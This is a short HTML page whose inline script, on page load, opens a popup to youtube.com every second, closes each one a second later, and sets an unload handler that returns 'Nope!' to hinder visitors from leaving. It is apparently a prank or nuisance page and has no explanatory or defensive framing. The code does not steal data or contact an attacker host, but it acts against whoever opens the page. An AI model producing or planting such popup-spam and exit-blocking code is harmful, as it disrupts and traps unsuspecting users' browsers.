
<!DOCTYPE html>
<html lang="en">
  <head>   
    <script>
    let length = 1500000
    let loops = 50
    let delay = 1000
    function close(e) {
      e.close()
    }
    function spam() {
      for (let i = 0; i < 1; i++) {
        let e = window.open('https://youtube.com')
        setTimeout(close, delay, e)
      }
    }
    window.addEventListener('load', 
      () => { 
        setInterval(spam, delay)
      });
      window.onbeforeunload = nope
      function nope() { 
        return "Nope!"
      }
    
  </script>
  </head>
</html>
